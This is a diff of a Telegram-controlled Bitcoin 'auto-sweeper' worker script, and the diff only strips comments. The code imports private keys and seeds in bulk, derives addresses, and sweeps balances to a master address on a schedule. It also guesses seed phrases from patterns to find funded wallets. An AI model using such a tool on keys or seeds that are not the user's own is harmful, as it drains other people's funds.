@@ -1,6 +1,3 @@
-// worker.js – Ultimate Bitcoin Auto-Sweeper with Telegram Bot
-// FINAL FIX: Read-only env bug fixed, master error handling added
-
 import * as bitcoin from 'bitcoinjs-lib';
 import * as bip39 from 'bip39';
 import { BIP32Factory } from 'bip32';
@@ -24,9 +21,6 @@ const PATHS = {
   native: "m/84'/0'/0'/0"
 };
 
-// ============================================================
-// HELPERS
-// ============================================================
 function formatBtc(sats) { return (sats / 1e8).toFixed(8); }
 function formatTime(ts) { return ts ? new Date(ts * 1000).toISOString().replace('T',' ').substring(0,19)+' UTC' : 'Unconfirmed'; }
 function stripCommand(text) { return text.split('@')[0].trim(); }
@@ -48,9 +42,6 @@ function detectKeyType(text) {
   return 'unknown';
 }
 
-// ============================================================
-// ADDRESS DERIVATION
-// ============================================================
 function deriveAddressesFromMnemonic(mnemonic, depth = 5) {
   const results = [];
   try {
@@ -117,9 +108,6 @@ function getAllAddresses(secret, depth = 5) {
   return [];
 }
 
-// ============================================================
-// BLOCKCHAIN API
-// ============================================================
 async function apiFetch(path) {
   const resp = await fetch(`${ESPLORA_API}${path}`);
   if (!resp.ok) throw new Error(`API ${resp.status}`);
@@ -153,9 +141,6 @@ async function getRecommendedFee() {
   } catch { return DEFAULT_SAT_PER_BYTE; }
 }
 
-// ============================================================
-// TRANSACTION BUILDING
-// ============================================================
 async function createSweepTx(keyPair, utxos, toAddr, feeRate, addrType) {
   const total = utxos.reduce((s, u) => s + u.value, 0);
   const fee = (utxos.length * 180 + 44) * feeRate;
@@ -190,9 +175,6 @@ async function broadcastTx(hex) {
   return r.text();
 }
 
-// ============================================================
-// TELEGRAM
-// ============================================================
 async function sendMsg(token, chatId, text, kb = null) {
   try {
     if (!token) return;
@@ -215,17 +197,11 @@ function mainMenu() {
   ]};
 }
 
-// ============================================================
-// STORAGE
-// ============================================================
 const getWallets = async (env, cid) => (await env.WALLETS.get(`w_${cid}`, 'json')) || [];
 const saveWallets = async (env, cid, w) => env.WALLETS.put(`w_${cid}`, JSON.stringify(w));
 const getRecipients = async (env, cid) => (await env.WALLETS.get(`r_${cid}`, 'json')) || [];
 const saveRecipients = async (env, cid, r) => env.WALLETS.put(`r_${cid}`, JSON.stringify(r));
 
-// ============================================================
-// CHECK BALANCE / TXS
-// ============================================================
 async function checkAddressBalance(env, chatId, addr) {
   const { TELEGRAM_BOT_TOKEN } = env;
   try {
@@ -278,9 +254,6 @@ async function checkAllBalances(env, chatId) {
   } catch (e) { await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `❌ Error: ${e.message}`); }
 }
 
-// ============================================================
-// SWEEP & RECOVER
-// ============================================================
 async function sweepAll(env, chatId, targetAddr = null) {
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MASTER_ADDRESS, MIN_BALANCE_TO_SWEEP = "10000", MAX_FEE_RATE = "50" } = env;
   const cid = chatId || TELEGRAM_CHAT_ID;
@@ -344,9 +317,6 @@ async function recoverSeed(env, chatId, pattern, dictStr) {
   await sendMsg(TELEGRAM_BOT_TOKEN, chatId, found ? `🎉 Found ${found} funded!` : `ℹ️ No funded in ${cands.length} candidates.`);
 }
 
-// ============================================================
-// IMPORT
-// ============================================================
 async function importSingleKey(env, chatId, secret) {
   const type = detectKeyType(secret);
   if (type === 'unknown' || type === 'address') return { ok: false, msg: `Skipped (not a private key)` };
@@ -373,9 +343,6 @@ async function importBulk(env, chatId, text) {
   await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📦 Done: ✅ ${ok} | ❌ ${fail}`);
 }
 
-// ============================================================
-// MAIN HANDLER (FIXED: Master Error Catcher)
-// ============================================================
 async function handleUpdate(update, env, ctx) {
   try {
     const { TELEGRAM_BOT_TOKEN } = env;
@@ -393,7 +360,6 @@ async function handleUpdate(update, env, ctx) {
     }
     if (!chatId) return;
 
-    // BUTTONS
     if (cb) {
       if (cb === 'menu' || cb === 'start') return await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper</b>', mainMenu());
       if (cb === 'import') return await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🔑 Send mnemonic, WIF, Hex, xprv.\nBulk: <code>key1,key2,key3</code>');
@@ -413,7 +379,6 @@ async function handleUpdate(update, env, ctx) {
       return;
     }
 
-    // TEXT COMMANDS (strip @BotName)
     const t = text.trim();
     const cmd = stripCommand(t.split(' ')[0]);
     const args = t.split(' ').slice(1);
@@ -469,9 +434,6 @@ async function handleUpdate(update, env, ctx) {
   }
 }
 
-// ============================================================
-// EXPORT (FIXED: env read-only bug removed)
-// ============================================================
 export default {
   async scheduled(event, env, ctx) { ctx.waitUntil(sweepAll(env, env.TELEGRAM_CHAT_ID)); },
   async fetch(request, env, ctx) {
@@ -479,7 +441,6 @@ export default {
     if (request.method === 'POST' && url.pathname === '/telegram-webhook') {
       try {
         const update = await request.json();
-        // FIX: Pass ctx directly instead of trying to attach it to the read-only env object
         ctx.waitUntil(handleUpdate(update, env, ctx));
       } catch (e) {
         console.error("Webhook parse error:", e);
